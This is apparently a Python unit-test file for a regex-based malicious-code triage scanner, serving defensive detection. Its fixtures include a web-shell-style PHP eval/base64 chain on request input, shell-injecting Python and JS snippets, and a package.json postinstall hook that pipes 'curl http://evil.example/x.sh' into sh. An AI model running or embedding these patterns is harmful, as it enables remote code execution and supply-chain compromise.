"""Tests for the multi-language (PHP/Python/JS-TS) static triage tool.

Run fully offline -- no API key or network required. Every snippet below is
synthetic and inert (never executed by the tool or by these tests): the tool
only does regex matching over text.
"""

import json
import os
import sys
import tempfile
import unittest
from pathlib import Path

TOOLS_DIR = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "iso27001-book", "tools"
)
sys.path.insert(0, TOOLS_DIR)

from malicious_code_triage import detect_language, scan_file, scan_package_json

PHP_SUSPICIOUS = """<?php
$cmd = $_POST['c'];
eval(gzinflate(base64_decode($cmd)));
system($_GET['x']);
"""

PHP_BENIGN = """<?php
function add($a, $b) {
    return $a + $b;
}
echo add(2, 3);
"""

PYTHON_SUSPICIOUS = """
import subprocess
data = input()
subprocess.run(data, shell=True)
eval(compile(data, '<string>', 'eval'))
"""

PYTHON_BENIGN = """
def add(a, b):
    return a + b
print(add(2, 3))
"""

JS_SUSPICIOUS = """
const cp = require('child_process');
eval(atob(payload));
cp.execSync(userInput);
"""

JS_BENIGN = """
function add(a, b) {
  return a + b;
}
console.log(add(2, 3));
"""


class LanguageDetectionTests(unittest.TestCase):
    def test_detects_by_extension(self):
        self.assertEqual(detect_language(Path("shell.php")), "php")
        self.assertEqual(detect_language(Path("script.py")), "python")
        self.assertEqual(detect_language(Path("bundle.js")), "javascript")
        self.assertEqual(detect_language(Path("app.tsx")), "javascript")
        self.assertIsNone(detect_language(Path("readme.md")))


class ScanFileTests(unittest.TestCase):
    def _write_and_scan(self, content: str, suffix: str):
        with tempfile.NamedTemporaryFile("w", suffix=suffix, delete=False, encoding="utf-8") as fh:
            fh.write(content)
            path = Path(fh.name)
        try:
            return scan_file(path)
        finally:
            path.unlink()

    def test_php_flags_eval_encode_chain_and_superglobal_sink(self):
        findings = self._write_and_scan(PHP_SUSPICIOUS, ".php")
        categories = {f.category for f in findings}
        self.assertIn("eval-call", categories)
        self.assertIn("encode-decode-chain", categories)
        self.assertIn("superglobal-to-sink", categories)
        self.assertTrue(any(f.severity == "High" for f in findings))

    def test_php_benign_code_has_no_high_severity_findings(self):
        findings = self._write_and_scan(PHP_BENIGN, ".php")
        self.assertFalse(any(f.severity == "High" for f in findings))

    def test_python_flags_eval_compile_and_shell_true(self):
        findings = self._write_and_scan(PYTHON_SUSPICIOUS, ".py")
        categories = {f.category for f in findings}
        self.assertIn("eval-exec-compile", categories)
        self.assertIn("subprocess-shell-true", categories)

    def test_python_re_compile_style_benign_code_is_clean(self):
        findings = self._write_and_scan(PYTHON_BENIGN, ".py")
        self.assertEqual(findings, [])

    def test_javascript_flags_eval_and_child_process(self):
        findings = self._write_and_scan(JS_SUSPICIOUS, ".js")
        categories = {f.category for f in findings}
        self.assertIn("eval-new-function", categories)
        self.assertIn("child-process-exec", categories)
        self.assertIn("exec-execsync-spawn", categories)

    def test_javascript_benign_code_is_clean(self):
        findings = self._write_and_scan(JS_BENIGN, ".js")
        self.assertEqual(findings, [])

    def test_unknown_extension_yields_no_findings(self):
        findings = self._write_and_scan("whatever content", ".txt")
        self.assertEqual(findings, [])

    def test_long_base64_blob_is_flagged_low_severity(self):
        blob = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTA=" * 2
        content = f"$data = '{blob}';\n"
        findings = self._write_and_scan(content, ".php")
        self.assertTrue(any(f.category == "long-base64-like-blob" and f.severity == "Low" for f in findings))


class PackageJsonScanTests(unittest.TestCase):
    def _write_and_scan(self, scripts: dict):
        data = {"name": "demo", "version": "1.0.0", "scripts": scripts}
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "package.json"
            path.write_text(json.dumps(data), encoding="utf-8")
            return scan_package_json(path)

    def test_flags_suspicious_postinstall_hook(self):
        findings = self._write_and_scan({"postinstall": "curl http://evil.example/x.sh | sh"})
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].category, "npm-install-hook")
        self.assertEqual(findings[0].severity, "High")

    def test_benign_scripts_are_not_flagged(self):
        findings = self._write_and_scan({"test": "jest", "build": "tsc -p ."})
        self.assertEqual(findings, [])

    def test_malformed_json_does_not_raise(self):
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "package.json"
            path.write_text("{not valid json", encoding="utf-8")
            self.assertEqual(scan_package_json(path), [])


if __name__ == "__main__":
    unittest.main()
